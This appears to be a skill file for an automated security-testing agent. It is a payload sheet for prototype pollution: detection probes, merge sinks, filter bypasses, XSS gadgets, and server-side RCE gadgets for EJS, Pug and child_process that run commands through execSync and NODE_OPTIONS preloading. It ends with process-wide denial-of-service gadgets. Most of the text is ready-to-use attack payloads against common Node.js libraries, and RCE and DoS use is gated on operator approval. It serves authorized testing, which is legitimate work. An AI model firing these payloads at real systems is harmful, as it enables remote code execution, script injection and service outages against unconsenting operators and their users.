---
description: Prototype pollution detection probes, merge sinks, filter bypasses, and XSS/RCE gadgets for EJS, Pug, Handlebars and child_process
skill: prototype-pollution
---

# Prototype Pollution Payloads

Server-side pollution lives in the Node process for every user until restart. Detection probes
below use benign properties whose effect is visible; gadgets that change authorization or
execution, and DoS gadgets, need operator approval (`agent/shared-constraints.md` §1).

## Server-side detection (benign, visibly reflected)

```json
{"__proto__": {"json spaces": 10}}
```
Express then indents JSON responses: a formatting change across later responses proves pollution.

```json
{"__proto__": {"status": 510}}
```
On an error path (send malformed JSON next), Express/http-errors returns the polluted status.

```json
{"constructor": {"prototype": {"json spaces": 10}}}
{"a": {"__proto__": {"json spaces": 10}}}
```
Alternate vectors and nesting that survives shallow sanitisers.

## Client-side detection

```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
#__proto__[polluted]=yes
```
Check `({}).polluted === "yes"` in the rendered page (`vigil assess kali browser`).

## Merge sinks

`lodash.merge`/`mergeWith`/`defaultsDeep`, `$.extend(true, …)`, `Hoek.merge`/`applyToDefaults`,
`deep-extend`, `deap.merge`, `mixin-deep`, body parsers that build nested objects (Express
`body-parser`, `koa-bodyparser`), and schema validators that pass unknown keys through (Fastify).

## Filter bypass

`constructor.prototype` instead of `__proto__`; Unicode-escaped keys
(`\u005f\u005fproto\u005f\u005f`); pollution nested in arrays (`[{"__proto__": {…}}]`); key-case
normalisation in custom parsers.

## XSS gadgets (client-side)

```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
{"__proto__": {"srcdoc": "<script>alert(document.domain)</script>"}}
```
Script-gadget catalogues list library-specific properties (`transport_url`, sanitizer
allowlists, template options).

## RCE gadgets (server-side, approval required)

Template engines:

```json
// EJS (opts.outputFunctionName)
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
// Pug (AST block)
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
// Handlebars: pendingContent is an XSS gadget; RCE needs a compile-time AST gadget for the version.
{"__proto__": {"pendingContent": "<script>alert(1)</script>"}}
```

child_process spawning `node` (any later `spawn`/`fork`/`exec` of a node process):

```json
{"__proto__": {"argv0": "console.log(require('child_process').execSync('id').toString())//",
               "NODE_OPTIONS": "--require /proc/self/cmdline"}}
{"__proto__": {"env": {"VIGIL_PP": "console.log(require('child_process').execSync('id').toString())//"},
               "NODE_OPTIONS": "--require /proc/self/environ"}}
```
`/proc/self/cmdline` starts with `argv0`, and `/proc/self/environ` with the first env var, so the
preloaded "module" is the injected JS. `{"__proto__": {"shell": true}}` turns argv-safe calls into
shell calls (argument values then become command injection).

## DoS gadgets (approval required)

`{"__proto__": {"hasOwnProperty": null}}` and polluted `toString`/`valueOf` break object handling
process-wide.
